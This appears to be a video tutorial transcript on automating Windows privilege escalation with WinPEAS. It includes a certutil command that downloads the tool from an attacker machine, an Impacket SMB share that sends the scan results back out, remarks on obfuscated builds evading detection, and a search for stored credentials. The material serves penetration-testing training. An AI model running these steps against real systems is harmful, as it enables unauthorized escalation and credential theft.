### **[Section 1: Introduction to Automated Windows Privilege Escalation & WinPEAS]**

Hello friends. In the previous video, we manually enumerated the target Windows system. We ran many commands and looked at various modules to identify potential avenues for privilege escalation in Windows. In this video, we are going to automate those manual checks—how automated enumeration is performed for privilege escalation is what we will explore.

In this video, we will primarily use two tools. I have used other tools as well, but I will demonstrate those in upcoming modules when their specific requirements arise. For now, I am going to use the most important tools.

The first tool we are going to use is **WinPEAS**. Here is its official GitHub repository. I will share this link with you, or you can search for it directly. Just like LinPEAS in Linux privilege escalation, WinPEAS is built using the exact same concepts and codebase, tailored specifically for Windows security checklists.

---

### **[Section 2: WinPEAS Formats (PowerShell, Batch, and Executables)]**

WinPEAS produces structured output and analysis, making it very easy to interpret. In my opinion, it is the most popular privilege escalation tool for non-hardened target environments—meaning environments without heavy endpoint detection or active blue-team monitoring. On those systems, automated tools save a lot of time; otherwise, we rely on manual enumeration or custom obfuscated scripts. Since we are covering core privilege escalation concepts, WinPEAS is more than sufficient.

Inside the GitHub repository, you will find three different formats:

1. **PowerShell Script (`winPEAS.ps1`)**: Written in PowerShell. If you understand PowerShell, you can view the source code and modify it—adding custom commands or removing unnecessary checks.
2. **Batch File (`winPEAS.bat`)**: Readable script performing signature-based checks.
3. **Executable Binary (`winPEAS.exe`)**: Compiled binary format.

---

### **[Section 3: Downloading Obfuscated vs. Non-Obfuscated Binaries]**

While automated tools save time, they rely on signature checks and may produce occasional false positives. In this video, we will focus on the executable (`.exe`) version.

Looking under the Releases section on GitHub, you can download pre-compiled binaries:

- **`winPEASany.exe`**: Compatible across all system architectures.
- **`winPEASx64.exe`**: Built specifically for 64-bit Windows architectures.
- **`winPEASx86.exe`**: Built for 32-bit legacy systems.

Both obfuscated and non-obfuscated versions are provided. Obfuscated builds bypass simple, entry-level signature detections, though they should still be used cautiously in real-world environments. For our 64-bit target system, we will download `winPEASx64.exe`.

---

### **[Section 4: Transferring WinPEAS to Target Host via `certutil`]**

I already have `winPEASx64.exe` saved locally on my attacking machine inside my OSCP tools directory. Now, I will transfer it to the target Windows machine.

On the target Windows host, we download the binary using Microsoft's built-in **`certutil.exe`** utility:

```
certutil -urlcache -f http://10.8.63.160:8000/winPEASx64.exe winPEAS.exe
```

We save it locally on the target under the shorter name `winPEAS.exe`.

To view execution parameters and directive flags, run the help menu:

```
winPEAS.exe -h
```

The help menu displays parameters for targeting specific components (such as system info, user info, or services) rather than running a full scan, as well as options to format output in plain text or write log files.

---

### **[Section 5: Executing WinPEAS & Redirecting Output to File]**

If you execute WinPEAS inside a Netcat reverse shell, colors render properly because Netcat supports ANSI escape sequences. However, running WinPEAS inside a standard RDP command prompt window fails to render ANSI colors, displaying raw ASCII color codes instead.

While you can run WinPEAS directly in an active shell, **I strongly recommend redirecting the output into a text file and transferring that file back to your attacking machine**:

```
winPEAS.exe > winpeas_out.txt
```

Saving output to `winpeas_out.txt` allows comfortable offline analysis without worrying about dropped reverse shell connections.

---

### **[Section 6: Exfiltrating Scan Results via Impacket SMB Server]**

To transfer `winpeas_out.txt` from the target Windows machine to Kali Linux, set up an SMB share using Impacket's **`smbserver.py`**:

1. **Start SMB Server on Kali**:
    
    ```
    python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
    ```
    
    _(This opens an SMB share named `share` mapping to the current working directory)_.
    
2. **Copy File from Windows Target**: On the Windows machine, execute the `copy` command specifying the UNC network path:
    
    ```
    copy winpeas_out.txt \\10.8.63.160\share\winpeas_out.txt
    ```
    

The file transfers cleanly across the network into your Kali Linux working directory.

### **[Section 7: Analyzing the WinPEAS Report & Color Legend]**

Now you can open and analyze `winpeas_out.txt` on Kali Linux using `cat`, `less`, or a text editor.

Reviewing the report header:

- **Banner & Legend**: Explains output color coding:
    - **RED / RED WITH YELLOW HIGHLIGHT**: High-confidence misconfigurations, special privileges, or vulnerable settings that can likely be abused for privilege escalation. Focus on red items first to minimize search time.
    - **GREEN**: Active security protections or well-configured system components.
    - **OTHER COLORS**: Differentiates active users, disabled accounts, and hyperlinks.

---

### **[Section 8: Key Report Sections (Kernel Exploits, Services, & Credentials)]**

Scanning through the generated report:

- **System & OS Information**: Displays OS Name, Version, Build Number (e.g., Windows 10 Build 1809), and Architecture.
- **Hotfixes & Kernel Exploits**: Lists installed KB patches and cross-references missing updates against public kernel CVEs.
- **Security Controls**: Displays status of Antivirus solutions, Credential Guard, and LSA Protection.
- **User Tokens & Privileges**: Details account privileges, token policies, and group memberships.
- **Services & File Permissions**: Lists installed Windows services, highlighting service binaries with writable permissions (`RED`) modifiable by standard users.
- **Stored Credentials**: Searches registry keys, configuration files, saved PuTTY sessions, AutoAdminLogon entries, setup XML files, and history logs for stored plaintext credentials.
